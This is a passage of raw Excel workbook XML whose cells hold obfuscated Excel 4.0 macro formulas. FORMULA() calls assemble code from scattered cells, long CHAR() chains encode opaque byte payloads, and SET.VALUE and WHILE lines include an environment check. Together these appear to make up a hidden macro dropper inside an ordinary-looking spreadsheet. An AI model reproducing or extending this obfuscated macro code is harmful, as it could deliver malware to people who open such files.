CHAR(66)&amp;CHAR(3)&amp;CHAR(128)&amp;CHAR(210)&amp;CHAR(164)&amp;CHAR(73)&amp;CHAR(75)&amp;CHAR(189)&amp;CHAR(198)&amp;CHAR(89)&amp;CHAR(74)&amp;CHAR(22)&amp;CHAR(252)&amp;CHAR(205)&amp;CHAR(146)&amp;CHAR(89)&amp;CHAR(165)&amp;CHAR(210)&amp;CHAR(197)&amp;CHAR(19)&amp;CHAR(171)&amp;CHAR(76)&amp;CHAR(77)&amp;CHAR(33)&amp;CHAR(127)</f>
        <v>ìŸ…“Ò_x000C_ÕdÁM¦…=_x000C_~@¨HcwŽ›ÓPÏ°gÒ™ß#´l4õç¦Å'™›£0vÃd’sþ¶~}¹HÉ±×eyÕF²ˆÝÈûÉu0óâ&amp;K_x0018_'©ä·q¨M«`¢
£mÏˆ‰yCš9i¯_x0001_T@zCz.2Dõü_x001C_˜_x0019__x0013_Ê¸_x000D_ÿ_x000D_²útiv„Ëj_x0003_Qãèt_x0013_(Æ´èUXõìöt _x001C__x0016_j¿óòOË;ÇŽÛ /_x000E__x001B_å–ìî_x001C_ˆÄSÃH1µy0G_x0002__x001D__x0008_hg·N¡ÝF*Õ8m¨ž_x0015_SCÉ_x0017_}Ú‰c}1}ÉÒmˆfy_x0003_æÂ&amp;.ÄÒ.µbo_x0010__x0011_{Ðå´=\ÍB_x0003_€Ò¤IK½ÆYJ_x0016_üÍ’Y¥ÒÅ_x0013_«LM!</v>
      </c>
      <c r="DG11" t="str">
        <f>CHAR(211)&amp;CHAR(150)&amp;CHAR(78)&amp;CHAR(242)&amp;CHAR(181)&amp;CHAR(134)&amp;CHAR(202)&amp;CHAR(124)&amp;CHAR(210)&amp;CHAR(150)</f>
        <v>Ó–Nòµ†Ê|Ò–</v>
      </c>
      <c r="DH11" t="s">
        <v>10</v>
      </c>
      <c r="DJ11" t="b">
        <f bx="1">main=$DF$1</f>
        <v>0</v>
      </c>
    </row>
    <row r="12" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE12" t="b">
        <f>FORMULA(DH65&amp;DH45&amp;DH31&amp;DH46&amp;DH71&amp;DH48&amp;DH27&amp;DH38&amp;DH47&amp;DH31&amp;DH66&amp;DH44&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH56&amp;DH76&amp;DH53&amp;DH67,DJ12)</f>
        <v>1</v>
      </c>
      <c r="DF12" t="str">
        <f>CHAR(252)&amp;CHAR(89)&amp;CHAR(140)&amp;CHAR(200)&amp;CHAR(197)&amp;CHAR(189)&amp;CHAR(89)&amp;CHAR(32)&amp;CHAR(188)&amp;CHAR(21)&amp;CHAR(61)&amp;CHAR(116)&amp;CHAR(198)&amp;CHAR(225)&amp;CHAR(35)&amp;CHAR(242)&amp;CHAR(156)&amp;CHAR(62)&amp;CHAR(115)&amp;CHAR(133)&amp;CHAR(24)&amp;CHAR(92)&amp;CHAR(50)&amp;CHAR(96)&amp;CHAR(210)&amp;CHAR(74)&amp;CHAR(208)&amp;CHAR(6)&amp;CHAR(129)&amp;CHAR(166)&amp;CHAR(83)&amp;CHAR(82)&amp;CHAR(69)&amp;CHAR(173)&amp;CHAR(120)&amp;CHAR(154)&amp;CHAR(253)&amp;CHAR(63)&amp;CHAR(18)&amp;CHAR(154)&amp;CHAR(167)&amp;CHAR(209)&amp;CHAR(235)&amp;CHAR(155)&amp;CHAR(176)&amp;CHAR(201)&amp;CHAR(172)&amp;CHAR(255)&amp;CHAR(106)&amp;CHAR(135)&amp;CHAR(189)&amp;CHAR(1)&amp;CHAR(254)&amp;CHAR(70)&amp;CHAR(51)&amp;CHAR(67)&amp;CHAR(81)&amp;CHAR(116)&amp;CHAR(132)&amp;CHAR(120)&amp;CHAR(45)&amp;CHAR(177)&amp;CHAR(130)&amp;CHAR(248)&amp;CHAR(213)&amp;CHAR(196)&amp;CHAR(73)&amp;CHAR(224)&amp;CHAR(104)&amp;CHAR(82)&amp;CHAR(145)&amp;CHAR(67)&amp;CHAR(133)&amp;CHAR(221)&amp;CHAR(129)&amp;CHAR(138)&amp;CHAR(80)&amp;CHAR(125)&amp;CHAR(140)&amp;CHAR(167)&amp;CHAR(197)&amp;CHAR(242)&amp;CHAR(207)&amp;CHAR(209)&amp;CHAR(59)&amp;CHAR(224)&amp;CHAR(170)&amp;CHAR(201)&amp;CHAR(203)&amp;CHAR(223)&amp;CHAR(176)&amp;CHAR(42)&amp;CHAR(206)&amp;CHAR(41)&amp;CHAR(165)&amp;CHAR(203)&amp;CHAR(166)&amp;CHAR(226)&amp;CHAR(7)&amp;CHAR(116)&amp;CHAR(236)&amp;CHAR(14)&amp;CHAR(62)&amp;CHAR(163)&amp;CHAR(76)&amp;CHAR(253)&amp;CHAR(106)&amp;CHAR(47)&amp;CHAR(204)&amp;CHAR(170)&amp;CHAR(38)&amp;CHAR(105)&amp;CHAR(141)&amp;CHAR(117)&amp;CHAR(210)&amp;CHAR(2)&amp;CHAR(190)&amp;CHAR(215)&amp;CHAR(160)&amp;CHAR(23)&amp;CHAR(2)&amp;CHAR(77)&amp;CHAR(105)&amp;CHAR(178)&amp;CHAR(138)&amp;CHAR(240)&amp;CHAR(254)&amp;CHAR(5)&amp;CHAR(221)&amp;CHAR(168)&amp;CHAR(249)&amp;CHAR(17)&amp;CHAR(204)&amp;CHAR(81)&amp;CHAR(27)&amp;CHAR(242)&amp;CHAR(238)&amp;CHAR(242)&amp;CHAR(103)&amp;CHAR(55)&amp;CHAR(65)&amp;CHAR(39)&amp;CHAR(69)&amp;CHAR(177)&amp;CHAR(108)&amp;CHAR(190)&amp;CHAR(133)&amp;CHAR(182)&amp;CHAR(33)&amp;CHAR(232)&amp;CHAR(239)&amp;CHAR(38)&amp;CHAR(55)&amp;CHAR(177)&amp;CHAR(178)&amp;CHAR(210)&amp;CHAR(132)&amp;CHAR(205)&amp;CHAR(192)&amp;CHAR(83)&amp;CHAR(30)&amp;CHAR(47)&amp;CHAR(242)&amp;CHAR(47)&amp;CHAR(153)&amp;CHAR(86)&amp;CHAR(196)&amp;CHAR(188)&amp;CHAR(4)&amp;CHAR(245)&amp;CHAR(210)&amp;CHAR(161)&amp;CHAR(147)&amp;CHAR(213)&amp;CHAR(94)&amp;CHAR(86)&amp;CHAR(6)&amp;CHAR(250)&amp;CHAR(134)&amp;CHAR(214)&amp;CHAR(105)&amp;CHAR(111)&amp;CHAR(130)&amp;CHAR(89)&amp;CHAR(163)&amp;CHAR(166)&amp;CHAR(150)&amp;CHAR(231)&amp;CHAR(135)&amp;CHAR(250)&amp;CHAR(252)&amp;CHAR(120)&amp;CHAR(179)&amp;CHAR(34)&amp;CHAR(226)&amp;CHAR(36)&amp;CHAR(241)&amp;CHAR(105)&amp;CHAR(194)&amp;CHAR(87)&amp;CHAR(98)&amp;CHAR(156)&amp;CHAR(124)&amp;CHAR(210)&amp;CHAR(18)&amp;CHAR(85)&amp;CHAR(201)&amp;CHAR(149)&amp;CHAR(102)&amp;CHAR(97)&amp;CHAR(72)&amp;CHAR(7)&amp;CHAR(116)&amp;CHAR(143)&amp;CHAR(107)&amp;CHAR(53)&amp;CHAR(137)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(3)&amp;CHAR(72)&amp;CHAR(69)&amp;CHAR(160)&amp;CHAR(224)&amp;CHAR(226)&amp;CHAR(64)&amp;CHAR(83)&amp;CHAR(196)&amp;CHAR(71)&amp;CHAR(235)&amp;CHAR(85)&amp;CHAR(28)&amp;CHAR(246)&amp;CHAR(94)&amp;CHAR(216)&amp;CHAR(177)&amp;CHAR(248)&amp;CHAR(3)&amp;CHAR(115)&amp;CHAR(115)&amp;CHAR(56)&amp;CHAR(9)&amp;CHAR(207)&amp;CHAR(129)&amp;CHAR(143)&amp;CHAR(26)&amp;CHAR(238)&amp;CHAR(40)&amp;CHAR(97)&amp;CHAR(239)&amp;CHAR(90)&amp;CHAR(153)&amp;CHAR(229)&amp;CHAR(76)&amp;CHAR(34)</f>
        <v>üYŒÈÅ½Y ¼_x0015_=tÆá#òœ&gt;s…_x0018_\2`ÒJÐ_x0006_¦SRE­xšý?_x0012_š§Ñë›°É¬ÿj‡½_x0001_þF3CQt„x-±‚øÕÄIàhR‘C…ÝŠP}Œ§ÅòÏÑ;àªÉËß°*Î)¥Ë¦â_x0007_tì_x000E_&gt;£Lýj/Ìª&amp;iuÒ_x0002_¾× _x0017__x0002_Mi²Šðþ_x0005_Ý¨ù_x0011_ÌQ_x001B_òîòg7A'E±l¾…¶!èï&amp;7±²Ò„ÍÀS_x001E_/ò/™VÄ¼_x0004_õÒ¡“Õ^V_x0006_ú†Öio‚Y£¦–ç‡úüx³"â$ñiÂWbœ|Ò_x0012_UÉ•faH_x0007_tk5‰_x0004__x0001__x0003_HE àâ@SÄGëU_x001C_ö^Ø±ø_x0003_ss8	Ï_x001A_î(aïZ™åL"</v>
      </c>
      <c r="DG12" t="str">
        <f>CHAR(9)&amp;CHAR(207)&amp;CHAR(152)&amp;CHAR(11)&amp;CHAR(145)&amp;CHAR(108)&amp;CHAR(210)&amp;CHAR(148)&amp;CHAR(141)&amp;CHAR(154)</f>
        <v xml:space="preserve">	Ï˜_x000B_‘lÒ”š</v>
      </c>
      <c r="DH12" t="s">
        <v>11</v>
      </c>
      <c r="DJ12" t="b">
        <f>SET.VALUE($DI$1,0)</f>
        <v>0</v>
      </c>
    </row>
    <row r="13" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE13" t="b">
        <f>FORMULA(DH65&amp;DH49&amp;DH34&amp;DH35&amp;DH38&amp;DH31&amp;DH66&amp;DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH69&amp;DH70&amp;DH68&amp;DH5&amp;DH24&amp;DH3&amp;DH5&amp;DH12&amp;DH68&amp;DH67,DJ13)</f>
        <v>1</v>
      </c>
      <c r="DF13" t="str">
        <f>CHAR(121)&amp;CHAR(87)&amp;CHAR(93)&amp;CHAR(112)&amp;CHAR(70)&amp;CHAR(47)&amp;CHAR(184)&amp;CHAR(162)&amp;CHAR(37)&amp;CHAR(227)&amp;CHAR(118)&amp;CHAR(229)&amp;CHAR(179)&amp;CHAR(31)&amp;CHAR(103)&amp;CHAR(41)&amp;CHAR(43)&amp;CHAR(167)&amp;CHAR(162)&amp;CHAR(126)&amp;CHAR(129)&amp;CHAR(165)&amp;CHAR(59)&amp;CHAR(58)&amp;CHAR(189)&amp;CHAR(132)&amp;CHAR(206)&amp;CHAR(215)&amp;CHAR(128)&amp;CHAR(179)&amp;CHAR(144)&amp;CHAR(253)&amp;CHAR(229)&amp;CHAR(19)&amp;CHAR(230)&amp;CHAR(44)&amp;CHAR(41)&amp;CHAR(139)&amp;CHAR(171)&amp;CHAR(101)&amp;CHAR(64)&amp;CHAR(123)&amp;CHAR(208)&amp;CHAR(253)&amp;CHAR(6)&amp;CHAR(164)&amp;CHAR(221)&amp;CHAR(188)&amp;CHAR(27)&amp;CHAR(52)&amp;CHAR(254)&amp;CHAR(252)&amp;CHAR(250)&amp;CHAR(210)&amp;CHAR(23)&amp;CHAR(46)&amp;CHAR(8)&amp;CHAR(19)&amp;CHAR(29)&amp;CHAR(133)&amp;CHAR(213)&amp;CHAR(43)&amp;CHAR(29)&amp;CHAR(65)&amp;CHAR(153)&amp;CHAR(232)&amp;CHAR(180)&amp;CHAR(119)&amp;CHAR(176)&amp;CHAR(60)&amp;CHAR(134)&amp;CHAR(74)&amp;CHAR(23)&amp;CHAR(154)&amp;CHAR(14)&amp;CHAR(2)&amp;CHAR(231)&amp;CHAR(15)&amp;CHAR(6)&amp;CHAR(84)&amp;CHAR(14)&amp;CHAR(42)&amp;CHAR(43)&amp;CHAR(103)&amp;CHAR(91)&amp;CHAR(84)&amp;CHAR(36)&amp;CHAR(226)&amp;CHAR(118)&amp;CHAR(9)&amp;CHAR(58)&amp;CHAR(97)&amp;CHAR(84)&amp;CHAR(105)&amp;CHAR(207)&amp;CHAR(206)&amp;CHAR(57)&amp;CHAR(147)&amp;CHAR(19)&amp;CHAR(36)&amp;CHAR(125)&amp;CHAR(22)&amp;CHAR(192)&amp;CHAR(174)&amp;CHAR(250)&amp;CHAR(10)&amp;CHAR(158)&amp;CHAR(185)&amp;CHAR(43)&amp;CHAR(55)&amp;CHAR(46)&amp;CHAR(205)&amp;CHAR(156)&amp;CHAR(235)&amp;CHAR(255)&amp;CHAR(163)&amp;CHAR(231)&amp;CHAR(49)&amp;CHAR(84)&amp;CHAR(55)&amp;CHAR(120)&amp;CHAR(252)&amp;CHAR(202)&amp;CHAR(118)&amp;CHAR(239)&amp;CHAR(71)&amp;CHAR(207)&amp;CHAR(49)&amp;CHAR(120)&amp;CHAR(236)&amp;CHAR(239)&amp;CHAR(122)&amp;CHAR(172)&amp;CHAR(167)&amp;CHAR(208)&amp;CHAR(251)&amp;CHAR(88)&amp;CHAR(162)&amp;CHAR(38)&amp;CHAR(119)&amp;CHAR(124)&amp;CHAR(63)&amp;CHAR(28)&amp;CHAR(137)&amp;CHAR(161)&amp;CHAR(174)&amp;CHAR(179)&amp;CHAR(108)&amp;CHAR(111)&amp;CHAR(219)&amp;CHAR(206)&amp;CHAR(60)&amp;CHAR(199)&amp;CHAR(87)&amp;CHAR(125)&amp;CHAR(115)&amp;CHAR(56)&amp;CHAR(82)&amp;CHAR(194)&amp;CHAR(177)&amp;CHAR(85)&amp;CHAR(172)&amp;CHAR(241)&amp;CHAR(158)&amp;CHAR(73)&amp;CHAR(198)&amp;CHAR(192)&amp;CHAR(244)&amp;CHAR(36)&amp;CHAR(34)&amp;CHAR(219)&amp;CHAR(116)&amp;CHAR(29)&amp;CHAR(28)&amp;CHAR(137)&amp;CHAR(192)&amp;CHAR(142)&amp;CHAR(172)&amp;CHAR(162)&amp;CHAR(222)&amp;CHAR(32)&amp;CHAR(7)&amp;CHAR(172)&amp;CHAR(198)&amp;CHAR(241)&amp;CHAR(240)&amp;CHAR(112)&amp;CHAR(5)&amp;CHAR(64)&amp;CHAR(13)&amp;CHAR(139)&amp;CHAR(72)&amp;CHAR(7)&amp;CHAR(223)&amp;CHAR(4)&amp;CHAR(239)&amp;CHAR(140)&amp;CHAR(152)&amp;CHAR(166)&amp;CHAR(32)&amp;CHAR(146)&amp;CHAR(207)&amp;CHAR(115)&amp;CHAR(61)&amp;CHAR(127)&amp;CHAR(59)&amp;CHAR(114)&amp;CHAR(8)&amp;CHAR(46)&amp;CHAR(56)&amp;CHAR(202)&amp;CHAR(69)&amp;CHAR(154)&amp;CHAR(58)&amp;CHAR(11)&amp;CHAR(29)&amp;CHAR(5)&amp;CHAR(103)&amp;CHAR(205)&amp;CHAR(215)&amp;CHAR(25)&amp;CHAR(204)&amp;CHAR(162)&amp;CHAR(134)&amp;CHAR(81)&amp;CHAR(186)&amp;CHAR(234)&amp;CHAR(52)&amp;CHAR(205)&amp;CHAR(10)&amp;CHAR(27)&amp;CHAR(92)&amp;CHAR(141)&amp;CHAR(210)&amp;CHAR(162)&amp;CHAR(64)&amp;CHAR(174)&amp;CHAR(250)&amp;CHAR(171)&amp;CHAR(190)&amp;CHAR(238)&amp;CHAR(167)&amp;CHAR(83)&amp;CHAR(233)&amp;CHAR(212)&amp;CHAR(217)&amp;CHAR(114)&amp;CHAR(1)&amp;CHAR(110)&amp;CHAR(162)&amp;CHAR(195)&amp;CHAR(150)&amp;CHAR(237)&amp;CHAR(36)&amp;CHAR(161)</f>
        <v>yW]pF/¸¢%ãvå³_x001F_g)+§¢~¥;:½„Î×€³ýå_x0013_æ,)‹«e@{Ðý_x0006_¤Ý¼_x001B_4þüúÒ_x0017_._x0008__x0013__x001D_…Õ+_x001D_A™è´w°&lt;†J_x0017_š_x000E__x0002_ç_x000F__x0006_T_x000E_*+g[T$âv	:aTiÏÎ9“_x0013_$}_x0016_À®ú
ž¹+7.Íœëÿ£ç1T7xüÊvïGÏ1xìïz¬§ÐûX¢&amp;w|?_x001C_‰¡®³loÛÎ&lt;ÇW}s8RÂ±U¬ñžIÆÀô$"Ût_x001D__x001C_‰ÀŽ¬¢Þ _x0007_¬Æñðp_x0005_@_x000D_‹H_x0007_ß_x0004_ïŒ˜¦ ’Ïs=;r_x0008_.8ÊEš:_x000B__x001D__x0005_gÍ×_x0019_Ì¢†Qºê4Í
_x001B_\Ò¢@®ú«¾î§SéÔÙr_x0001_n¢Ã–í$¡</v>
      </c>
      <c r="DG13" t="str">
        <f>CHAR(94)&amp;CHAR(157)&amp;CHAR(54)&amp;CHAR(53)&amp;CHAR(20)&amp;CHAR(102)&amp;CHAR(50)&amp;CHAR(159)&amp;CHAR(92)&amp;CHAR(72)</f>
        <v>^65_x0014_f2Ÿ\H</v>
      </c>
      <c r="DH13" t="s">
        <v>12</v>
      </c>
      <c r="DJ13" t="b">
        <f>WHILE(main&lt;&gt;"excel")</f>
        <v>0</v>
      </c>
    </row>
    <row r="14" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE14" t="b">
        <f>FORMULA(DH65&amp;DH45&amp;DH31&amp;DH46&amp;DH71&amp;DH48&amp;DH27&amp;DH38&amp;DH47&amp;DH31&amp;DH66&amp;DH44&amp;DH55&amp;DH29&amp;DH54&amp;DH54&amp;DH56&amp;DH76&amp;DH38&amp;DH31&amp;DH40&amp;DH66&amp;DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH67&amp;DH67,DJ14)</f>
        <v>1</v>
      </c>
      <c r="DF14" t="str">
        <f>CHAR(42)&amp;CHAR(206)&amp;CHAR(146)&amp;CHAR(113)&amp;CHAR(18)&amp;CHAR(194)&amp;CHAR(239)&amp;CHAR(252)&amp;CHAR(52)&amp;CHAR(3)&amp;CHAR(79)&amp;CHAR(224)&amp;CHAR(132)&amp;CHAR(229)&amp;CHAR(3)&amp;CHAR(59)&amp;CHAR(58)&amp;CHAR(110)&amp;CHAR(64)&amp;CHAR(28)&amp;CHAR(8)&amp;CHAR(163)&amp;CHAR(125)&amp;CHAR(151)&amp;CHAR(163)&amp;CHAR(166)&amp;CHAR(243)&amp;CHAR(13)&amp;CHAR(5)&amp;CHAR(8)&amp;CHAR(177)&amp;CHAR(14)&amp;CHAR(47)&amp;CHAR(122)&amp;CHAR(178)&amp;CHAR(247)&amp;CHAR(119)&amp;CHAR(111)&amp;CHAR(58)&amp;CHAR(4)&amp;CHAR(36)&amp;CHAR(113)&amp;CHAR(152)&amp;CHAR(167)&amp;CHAR(138)&amp;CHAR(100)&amp;CHAR(153)&amp;CHAR(244)&amp;CHAR(184)&amp;CHAR(160)&amp;CHAR(99)&amp;CHAR(34)&amp;CHAR(7)&amp;CHAR(125)&amp;CHAR(15)&amp;CHAR(230)&amp;CHAR(204)&amp;CHAR(249)&amp;CHAR(223)&amp;CHAR(230)&amp;CHAR(137)&amp;CHAR(63)&amp;CHAR(189)&amp;CHAR(217)&amp;CHAR(146)&amp;CHAR(161)&amp;CHAR(67)&amp;CHAR(94)&amp;CHAR(31)&amp;CHAR(141)&amp;CHAR(68)&amp;CHAR(82)&amp;CHAR(179)&amp;CHAR(201)&amp;CHAR(149)&amp;CHAR(84)&amp;CHAR(1)&amp;CHAR(167)&amp;CHAR(18)&amp;CHAR(118)&amp;CHAR(183)&amp;CHAR(162)&amp;CHAR(230)&amp;CHAR(167)&amp;CHAR(2)&amp;CHAR(242)&amp;CHAR(39)&amp;CHAR(186)&amp;CHAR(209)&amp;CHAR(54)&amp;CHAR(27)&amp;CHAR(169)&amp;CHAR(94)&amp;CHAR(58)&amp;CHAR(55)&amp;CHAR(73)&amp;CHAR(247)&amp;CHAR(180)&amp;CHAR(219)&amp;CHAR(148)&amp;CHAR(170)&amp;CHAR(228)&amp;CHAR(53)&amp;CHAR(148)&amp;CHAR(79)&amp;CHAR(2)&amp;CHAR(167)&amp;CHAR(230)&amp;CHAR(76)&amp;CHAR(146)&amp;CHAR(229)&amp;CHAR(55)&amp;CHAR(194)&amp;CHAR(197)&amp;CHAR(108)&amp;CHAR(99)&amp;CHAR(43)&amp;CHAR(175)&amp;CHAR(100)&amp;CHAR(9)&amp;CHAR(215)&amp;CHAR(145)&amp;CHAR(171)&amp;CHAR(15)&amp;CHAR(184)&amp;CHAR(120)&amp;CHAR(26)&amp;CHAR(144)&amp;CHAR(203)&amp;CHAR(140)&amp;CHAR(204)&amp;CHAR(109)&amp;CHAR(125)&amp;CHAR(49)&amp;CHAR(128)&amp;CHAR(210)&amp;CHAR(62)&amp;CHAR(82)&amp;CHAR(84)&amp;CHAR(181)&amp;CHAR(224)&amp;CHAR(237)&amp;CHAR(123)&amp;CHAR(243)&amp;CHAR(116)&amp;CHAR(225)&amp;CHAR(156)&amp;CHAR(247)&amp;CHAR(118)&amp;CHAR(14)&amp;CHAR(186)&amp;CHAR(249)&amp;CHAR(51)&amp;CHAR(116)&amp;CHAR(164)&amp;CHAR(47)&amp;CHAR(161)&amp;CHAR(74)&amp;CHAR(220)&amp;CHAR(206)&amp;CHAR(175)&amp;CHAR(88)&amp;CHAR(231)&amp;CHAR(150)&amp;CHAR(208)&amp;CHAR(60)&amp;CHAR(167)&amp;CHAR(21)&amp;CHAR(110)&amp;CHAR(19)&amp;CHAR(28)&amp;CHAR(107)&amp;CHAR(217)&amp;CHAR(55)&amp;CHAR(135)&amp;CHAR(112)&amp;CHAR(174)&amp;CHAR(30)&amp;CHAR(75)&amp;CHAR(240)&amp;CHAR(111)&amp;CHAR(74)&amp;CHAR(46)&amp;CHAR(107)&amp;CHAR(223)&amp;CHAR(224)&amp;CHAR(111)&amp;CHAR(210)&amp;CHAR(17)&amp;CHAR(200)&amp;CHAR(189)&amp;CHAR(231)&amp;CHAR(70)&amp;CHAR(51)&amp;CHAR(20)&amp;CHAR(252)&amp;CHAR(92)&amp;CHAR(245)&amp;CHAR(6)&amp;CHAR(148)&amp;CHAR(99)&amp;CHAR(48)&amp;CHAR(141)&amp;CHAR(14)&amp;CHAR(3)&amp;CHAR(186)&amp;CHAR(49)&amp;CHAR(237)&amp;CHAR(137)&amp;CHAR(194)&amp;CHAR(140)&amp;CHAR(120)&amp;CHAR(229)&amp;CHAR(68)&amp;CHAR(244)&amp;CHAR(211)&amp;CHAR(150)&amp;CHAR(113)&amp;CHAR(99)&amp;CHAR(26)&amp;CHAR(247)&amp;CHAR(135)&amp;CHAR(132)&amp;CHAR(54)&amp;CHAR(235)&amp;CHAR(129)&amp;CHAR(189)&amp;CHAR(175)&amp;CHAR(33)&amp;CHAR(123)&amp;CHAR(39)&amp;CHAR(232)&amp;CHAR(170)&amp;CHAR(190)&amp;CHAR(216)&amp;CHAR(82)&amp;CHAR(56)&amp;CHAR(46)&amp;CHAR(181)&amp;CHAR(60)&amp;CHAR(164)&amp;CHAR(209)&amp;CHAR(214)&amp;CHAR(165)&amp;CHAR(130)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(115)&amp;CHAR(22)&amp;CHAR(5)&amp;CHAR(3)&amp;CHAR(204)&amp;CHAR(100)&amp;CHAR(57)&amp;CHAR(69)</f>
        <v>*Î’q_x0012_Âïü4_x0003_Oà„å_x0003_;:n@_x001C__x0008_£}—£¦ó_x000D__x0005__x0008_±_x000E_/z²÷wo:_x0004_$q˜§Šd™ô¸ c"_x0007_}_x000F_æÌùßæ‰?½Ù’¡C^_x001F_DR³É•T_x0001_§_x0012_v·¢æ§_x0002_ò'ºÑ6_x001B_©^:7I÷´Û”ªä5”O_x0002_§æL’å7ÂÅlc+¯d	×‘«_x000F_¸x_x001A_ËŒÌm}1€Ò&gt;RTµàí{ótáœ÷v_x000E_ºù3t¤/¡JÜÎ¯Xç–Ð&lt;§_x0015_n_x0013__x001C_kÙ7‡p®_x001E_KðoJ.kßàoÒ_x0011_È½çF3_x0014_ü\õ_x0006_”c0_x000E__x0003_º1í‰ÂŒxåDôÓ–qc_x001A_÷‡„6ë½¯!{'èª¾ØR8.µ&lt;¤ÑÖ¥‚_x0002_‰s_x0016__x0005__x0003_Ìd9E</v>
      </c>
      <c r="DG14" t="str">
        <f>CHAR(102)&amp;CHAR(248)&amp;CHAR(95)&amp;CHAR(105)&amp;CHAR(116)&amp;CHAR(93)&amp;CHAR(242)&amp;CHAR(6)&amp;CHAR(54)&amp;CHAR(29)</f>
        <v>fø_it]ò_x0006_6_x001D_</v>
      </c>
      <c r="DH14" t="s">
        <v>13</v>
      </c>
      <c r="DJ14" t="b">
        <f>SET.VALUE($DI$2,LEN(main))</f>
        <v>0</v>
      </c>
    </row>
    <row r="15" spans="109:114" x14ac:dyDescent="0.45">
      <c r="DE15" t="b">
        <f>FORMULA(DH65&amp;DH49&amp;DH42&amp;DH18&amp;DH15&amp;DH3&amp;DH5&amp;DH19&amp;DH19&amp;DH39&amp;DH5&amp;DH13&amp;DH15&amp;DH18&amp;DH25&amp;DH66&amp;DH75&amp;DH54&amp;DH76&amp;DH44&amp;DH54&amp;DH53&amp;DH29&amp;DH54&amp;DH54&amp;DH57&amp;DH72&amp;DH66&amp;DH44&amp;DH54&amp;DH29&amp;DH54&amp;DH54&amp;DH56&amp;DH73&amp;DH55&amp;DH58&amp;DH58&amp;DH67&amp;DH76&amp;DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH76&amp;DH38&amp;DH31&amp;DH40&amp;DH66&amp;DH13&amp;DH1&amp;DH9&amp;DH14&amp;DH67&amp;DH76&amp;DH53&amp;DH67,DJ15)</f>
        <v>1</v>
      </c>
      <c r="DF15" t="str">
        <f>CHAR(226)&amp;CHAR(242)&amp;CHAR(190)&amp;CHAR(56)&amp;CHAR(161)&amp;CHAR(162)&amp;CHAR(164)&amp;CHAR(76)&amp;CHAR(219)&amp;CHAR(85)&amp;CHAR(105)&amp;CHAR(148)&amp;CHAR(252)&amp;CHAR(19)&amp;CHAR(96)&amp;CHAR(204)&amp;CHAR(87)&amp;CHAR(222)&amp;CHAR(233)&amp;CHAR(175)&amp;CHAR(183)&amp;CHAR(49)&amp;CHAR(217)&amp;CHAR(25)&amp;CHAR(74)&amp;CHAR(232)&amp;CHAR(167)&amp;CHAR(54)&amp;CHAR(82)&amp;CHAR(55)&amp;CHAR(127)&amp;CHAR(218)&amp;CHAR(120)&amp;CHAR(86)&amp;CHAR(37)&amp;CHAR(7)&amp;CHAR(143)&amp;CHAR(199)&amp;CHAR(56)&amp;CHAR(129)&amp;CHAR(125)&amp;CHAR(228)&amp;CHAR(107)&amp;CHAR(135)&amp;CHAR(110)&amp;CHAR(95)&amp;CHAR(202)&amp;CHAR(89)&amp;CHAR(112)&amp;CHAR(243)&amp;CHAR(33)&amp;CHAR(193)&amp;CHAR(107)&amp;CHAR(111)&amp;CHAR(84)&amp;CHAR(89)&amp;CHAR(218)&amp;CHAR(135)&amp;CHAR(172)&amp;CHAR(251)&amp;CHAR(135)&amp;CHAR(201)&amp;CHAR(132)&amp;CHAR(99)&amp;CHAR(234)&amp;CHAR(166)&amp;CHAR(215)&amp;CHAR(166)&amp;CHAR(225)&amp;CHAR(3)&amp;CHAR(130)&amp;CHAR(251)&amp;CHAR(164)&amp;CHAR(24)&amp;CHAR(177)&amp;CHAR(5)&amp;CHAR(76)&amp;CHAR(67)&amp;CHAR(104)&amp;CHAR(44)&amp;CHAR(104)&amp;CHAR(151)&amp;CHAR(202)&amp;CHAR(204)&amp;CHAR(84)&amp;CHAR(243)&amp;CHAR(2)&amp;CHAR(205)&amp;CHAR(243)&amp;CHAR(177)&amp;CHAR(32)&amp;CHAR(57)&amp;CHAR(253)&amp;CHAR(251)&amp;CHAR(186)&amp;CHAR(191)&amp;CHAR(61)&amp;CHAR(80)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(151)&amp;CHAR(126)&amp;CHAR(111)&amp;CHAR(247)&amp;CHAR(180)&amp;CHAR(44)&amp;CHAR(21)&amp;CHAR(199)&amp;CHAR(57)&amp;CHAR(96)&amp;CHAR(44)&amp;CHAR(82)&amp;CHAR(54)&amp;CHAR(123)&amp;CHAR(77)&amp;CHAR(4)&amp;CHAR(55)&amp;CHAR(190)&amp;CHAR(184)&amp;CHAR(113)&amp;CHAR(246)&amp;CHAR(21)&amp;CHAR(174)&amp;CHAR(53)&amp;CHAR(60)&amp;CHAR(100)&amp;CHAR(223)&amp;CHAR(185)&amp;CHAR(56)&amp;CHAR(36)&amp;CHAR(250)&amp;CHAR(67)&amp;CHAR(226)&amp;CHAR(213)&amp;CHAR(78)&amp;CHAR(94)&amp;CHAR(51)&amp;CHAR(21)&amp;CHAR(193)&amp;CHAR(38)&amp;CHAR(148)&amp;CHAR(178)&amp;CHAR(81)&amp;CHAR(16)&amp;CHAR(173)&amp;CHAR(74)&amp;CHAR(171)&amp;CHAR(224)&amp;CHAR(219)&amp;CHAR(216)&amp;CHAR(234)&amp;CHAR(131)&amp;CHAR(111)&amp;CHAR(210)&amp;CHAR(135)&amp;CHAR(230)&amp;CHAR(165)&amp;CHAR(58)&amp;CHAR(60)&amp;CHAR(197)&amp;CHAR(243)&amp;CHAR(162)&amp;CHAR(186)&amp;CHAR(254)&amp;CHAR(74)&amp;CHAR(78)&amp;CHAR(235)&amp;CHAR(163)&amp;CHAR(241)&amp;CHAR(216)&amp;CHAR(98)&amp;CHAR(238)&amp;CHAR(92)&amp;CHAR(27)&amp;CHAR(95)&amp;CHAR(217)&amp;CHAR(221)&amp;CHAR(39)&amp;CHAR(164)&amp;CHAR(171)&amp;CHAR(244)&amp;CHAR(28)&amp;CHAR(108)&amp;CHAR(8)&amp;CHAR(134)&amp;CHAR(117)&amp;CHAR(48)&amp;CHAR(114)&amp;CHAR(131)&amp;CHAR(206)&amp;CHAR(50)&amp;CHAR(215)&amp;CHAR(225)&amp;CHAR(46)&amp;CHAR(82)&amp;CHAR(218)&amp;CHAR(125)&amp;CHAR(250)